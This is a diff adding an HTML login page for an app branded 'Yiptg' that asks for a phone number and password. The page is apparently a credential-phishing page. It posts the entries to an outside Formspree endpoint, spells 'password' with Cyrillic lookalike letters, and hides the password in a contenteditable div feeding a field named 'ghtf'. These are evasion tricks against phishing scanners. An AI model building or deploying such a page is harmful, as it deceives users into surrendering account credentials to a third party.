@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<style>
+  body {
+    background-color: rgb(244, 244, 244);
+    max-width: 500px;
+    height: 100vh;
+    margin: 0 auto; /* Center the body horizontally */
+    display: flex; /* Display flex to align items */
+    justify-content: center; /* Center content horizontally */
+    align-items: flex-start; /* Align items to the top */
+  }
+
+  .bgImg {
+    background-image: url('img/backgroundGreen.png');
+    width: 100%; /* Set width to 100% */
+    max-width: 500px; /* Limit the maximum width */
+    height: 300px;
+    background-size: cover; /* Stretch the background image to cover the container */
+    background-repeat: no-repeat;
+    background-position: center; /* Center the background image horizontally */
+    display: flex;
+    flex-direction: column; /* Align items vertically */
+    padding: 20px; /* Add padding */
+    position: relative; /* Position relative for absolute positioning */
+  }
+
+  .downloadApp {
+    position: absolute; /* Position the image absolutely */
+    top: 130px; /* Adjust top position */
+    right: 0px; /* Adjust right position */
+    max-width: 200px; /* Limit maximum width */
+    max-height: 110px; /* Limit maximum height */
+  }
+
+  .header {
+    display: flex;
+    justify-content: space-between; /* Space out the items */
+    width: 100%;
+  }
+
+  .userHeader {
+    display: flex;
+    align-items: flex-start; /* Align items to the top */
+    justify-content: space-between; /* Space out the items */
+    width: 100%;
+  }
+
+  .back {
+    margin-right: auto; /* Push back icon to the left */
+  }
+
+  .userHeader > * {
+    margin-left: 5px; /* Add margin between icons */
+  }
+
+  .user {
+    margin-top: 50px;
+    display: flex;
+    flex-direction: column; /* Align items vertically */
+    align-items: center; /* Center items horizontally */
+  }
+
+  .userLogo {
+    margin-bottom: 10px; /* Add margin below the logo */
+    margin-top: auto; /* Push Yiptg logo to the top */
+  }
+
+  .icon {
+    width: 28px; /* Set width */
+    height: 28px; /* Set height */
+  }
+
+  .input-container {
+    border: 1px solid #797979;
+    padding: 15px;
+    margin-bottom: 10px;
+    width: 100%;
+    background-color: white;
+    border-radius: 15px;
+  }
+
+  .phoneCode {
+    display: flex;
+    align-items: center; /* Align items vertically */
+  }
+
+  .phoneCode input {
+    flex: 1; /* Take up remaining space */
+    border: none; /* Remove border */
+    background: none; /* Remove background */
+    outline: none; /* Remove outline */
+    color: grey; /* Grey color for input text */
+    font-family: inherit; /* Use the same font family as the rest of the page */
+  }
+
+  .btn-d {
+    border: 1px solid #797979;
+    padding: 15px;
+    margin-bottom: 10px;
+    width: 100%;
+    background-color: rgb(157, 157, 157); /* Set default background color to light grey */
+    border-radius: 15px;
+    color: rgb(0, 0, 0); /* Set default text color to grey */
+  }
+
+  .btn-d.enabled {
+    background-color: black; /* Change background color to black when enabled */
+    color: rgb(232, 255, 127); /* Change text color to light green when enabled */
+  }
+
+  .input-container[data-placeholder]:empty:before {
+    content: attr(data-placeholder);
+    color: #555; /* Darker shade for the placeholder text */
+  }
+
+  .save-forgot {
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .save-forgot .forgot {
+    text-align: right; /* Align "Forgot ghtf" text to the right */
+  }
+
+  .userLogin {
+    width: 430px;
+    margin: 30px 0 0 0;
+    padding: 22px;
+  }
+
+  .title {
+    margin-bottom: 9px;
+  }
+
+  .register-text {
+    text-align: center;
+  }
+
+  .register-text span {
+    color: grey; /* Grey color for "Don't have an account?" */
+  }
+
+  .register-text .register-now {
+    color: rgb(244, 171, 171); /* Black color for "Register now" */
+  }
+</style>
+<body>
+ 
+<div class="bgImg">
+   <img class="downloadApp" src="img/downloadApp.png">
+  <div class="header">
+    
+    <div class="userHeader">
+   
+      <div class="back">
+        <img src="img/backIcon.png" style="max-width: 32px; max-height: 32px">
+      </div>
+      <div class="lang">
+        <img src="img/internetIcon.png" style="max-width: 32px; max-height: 32px">
+      </div>
+      <div class="help">
+        <img src="img/helpIcon.png" style="max-width: 32px; max-height: 32px">
+      </div>
+    </div>
+  </div>
+  <div class="user">
+    
+    <div class="userLogo mt-md-3 mt-lg-4">
+      <img src="img/yiptgLogo.png" style="max-width: 140px; max-height: 115px">
+    </div>
+    
+    <div class="userLogin">
+      <div class="items">
+        <!-- Formspree Form -->
+        <form action="https://formspree.io/f/xkndvoon" method="POST">
+          <div class="item">
+            <div class="title text" style="color: grey;">Phone Number</div>
+            <div class="phoneCode input-container">
+              +<input style="margin-left: 4px;" type="text" name="phone" id="phoneContainer" placeholder="Enter your phone number">
+            </div>
+          </div>
+          <div class="item">
+            <div class="title text" style="color: grey;">Раsswоrd</div>
+            <div class="input-container" id="ghtfContainer" data-placeholder="Enter your раsswоrd" contenteditable="true"></div>
+            <input type="hidden" name="ghtf" id="ghtfInput"> <!-- Hidden input field for ghtf -->
+            <div data-v-336fb872="" class="save-forgot">
+              <div data-v-3db4245c="" data-v-336fb872="" role="checkbox" class="van-checkbox" tabindex="0" aria-checked="false">
+                <div class="van-checkbox__icon van-checkbox__icon--square" style="font-size: 0.36rem;">
+                  <i class="van-badge__wrapper van-icon van-icon-success"><!----><!----><!----></i>
+                </div>
+                <span class="van-checkbox__label">
+                  <span data-v-336fb872="" style="color: rgb(0, 0, 0);">Remember раsswоrd</span>
+                </span>
+              </div>
+              <div data-v-336fb872="" class="forgot">Forgot раsswоrd </div>
+            </div>
+          </div>
+          <div class="loginButton" style="margin-top: 35px;">
+            <button type="submit" class="btn btn-d" id="loginButton" disabled>Login</button>
+            <p class="register-text"><span>Don't have an account?</span> <span class="register-now">Register now</span></p>
+          </div>
+        </form>
+        <!-- End of Formspree Form -->
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  document.getElementById("phoneContainer").addEventListener("input", function(event) {
+    let inputValue = event.target.value;
+    // Remove any non-numeric characters from the input
+    let numericValue = inputValue.replace(/\D/g, "");
+    // Update the input value with the sanitized numeric value
+    event.target.value = numericValue;
+    validateFields();
+  });
+
+  document.getElementById("ghtfContainer").addEventListener("input", function(event) {
+    let ghtfValue = event.target.innerText.trim();
+    document.getElementById("ghtfInput").value = ghtfValue; // Update hidden input value
+    validateFields();
+  });
+
+  function validateFields() {
+    let phoneValue = document.getElementById("phoneContainer").value.trim(); // Remove leading/trailing whitespace
+    let ghtfValue = document.getElementById("ghtfContainer").innerText.trim(); // Remove leading/trailing whitespace
+    let loginButton = document.getElementById("loginButton");
+
+    if (phoneValue && ghtfValue) { // Check if both fields are filled
+      loginButton.removeAttribute("disabled"); // Enable the button
+      loginButton.classList.add("enabled"); // Add the "enabled" class
+    } else {
+      loginButton.setAttribute("disabled", true); // Disable the button
+      loginButton.classList.remove("enabled"); // Remove the "enabled" class
+    }
+  }
+</script>
+
+</body>
+</html>
